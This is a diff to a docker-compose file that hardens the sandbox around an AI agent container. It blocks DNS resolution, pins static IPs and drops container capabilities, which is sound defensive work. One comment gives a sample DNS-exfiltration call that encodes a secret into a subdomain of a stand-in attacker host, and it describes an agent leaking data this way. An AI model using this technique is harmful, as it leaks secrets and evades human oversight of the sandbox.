@@ -72,6 +72,20 @@ services:
 
     networks:
       - sandbox-internal
+    # DNS lockdown (closes the DNS-exfil side channel that internal:true does
+    # NOT close on its own). Docker's embedded resolver at 127.0.0.11 forwards
+    # any name it can't answer locally to the host resolver — which queries
+    # authoritative DNS on the real internet, so an agent could exfil data via
+    # crafted subdomain queries (`getaddrinfo("base32-secret.attacker.tld")`).
+    # We sinkhole DNS to 127.0.0.1 (no resolver listening) and inject the only
+    # hostnames the agent legitimately needs into /etc/hosts via extra_hosts.
+    # Static IPs for those hosts come from the ipam config on sandbox-internal.
+    dns:
+      - 127.0.0.1
+    extra_hosts:
+      - "egress-proxy:172.30.0.10"
+      - "postgres:172.30.0.20"
+      - "mongo:172.30.0.30"
     env_file:
       # Optional DB creds — only present for profiles that opted into the
       # postgres/mongo sibling containers. required: false so profiles
@@ -122,13 +136,29 @@ services:
       # image manages a version-subdir inside to support pg_upgrade --link.
       - postgres-data:/var/lib/postgresql:rw
     networks:
-      - sandbox-internal
+      sandbox-internal:
+        # Fixed IP so claude-agent's extra_hosts entry resolves it without
+        # falling back to a forwarding DNS resolver. See "DNS lockdown" above.
+        ipv4_address: 172.30.0.20
     # Uncomment to expose to host GUI tools (TablePlus, DBeaver, psql on mac).
     # Loopback-only — do not bind 0.0.0.0.
     # ports:
     #   - "127.0.0.1:5432:5432"
     security_opt:
       - no-new-privileges:true
+    # Drop default Docker caps and re-grant only what postgres' entrypoint
+    # actually needs (chown the data dir on init, setuid/setgid to drop from
+    # root → postgres). Without this the DB runs with CAP_NET_RAW and other
+    # default-set caps it doesn't need — soft landing pad if anything compromises
+    # postgres via the agent's superuser creds (TODO.md: least-privilege split).
+    cap_drop:
+      - ALL
+    cap_add:
+      - CHOWN
+      - DAC_OVERRIDE
+      - FOWNER
+      - SETGID
+      - SETUID
     mem_limit: 2g
     cpus: 2
     restart: unless-stopped
@@ -154,12 +184,26 @@ services:
     volumes:
       - mongo-data:/data/db:rw
     networks:
-      - sandbox-internal
+      sandbox-internal:
+        # Fixed IP so claude-agent's extra_hosts entry resolves it without
+        # falling back to a forwarding DNS resolver. See "DNS lockdown" above.
+        ipv4_address: 172.30.0.30
     # Uncomment to expose to host GUI tools (Compass, mongosh on mac).
     # ports:
     #   - "127.0.0.1:27017:27017"
     security_opt:
       - no-new-privileges:true
+    # Same logic as postgres above: drop the default cap set, re-grant only
+    # the four mongo's entrypoint needs to chown /data/db on init and drop
+    # privs from root → mongodb at startup.
+    cap_drop:
+      - ALL
+    cap_add:
+      - CHOWN
+      - DAC_OVERRIDE
+      - FOWNER
+      - SETGID
+      - SETUID
     mem_limit: 2g
     cpus: 2
     restart: unless-stopped
@@ -201,14 +245,28 @@ services:
     mem_limit: 512m
     cpus: 0.5
     networks:
-      - sandbox-internal
-      - sandbox-external
+      sandbox-internal:
+        # Fixed IP so claude-agent's extra_hosts entry resolves it without
+        # falling back to a forwarding DNS resolver. See "DNS lockdown" above.
+        ipv4_address: 172.30.0.10
+      sandbox-external:
     restart: unless-stopped
 
 networks:
   sandbox-internal:
     driver: bridge
     internal: true
+    # Static subnet so we can pin egress-proxy/postgres/mongo to known IPs
+    # and feed them to claude-agent via extra_hosts. Required to make the
+    # `dns: [127.0.0.1]` sinkhole on claude-agent workable — without static
+    # IPs we'd have no reliable way to pre-populate /etc/hosts. The /24 lives
+    # in Docker's typical private range and is per-profile (each profile gets
+    # its own bridge under its own COMPOSE_PROJECT_NAME), so no subnet collision
+    # between profiles. If 172.30.0.0/24 conflicts with a host network you use,
+    # change it here and update the extra_hosts / ipv4_address entries above.
+    ipam:
+      config:
+        - subnet: 172.30.0.0/24
   sandbox-external:
     driver: bridge
 
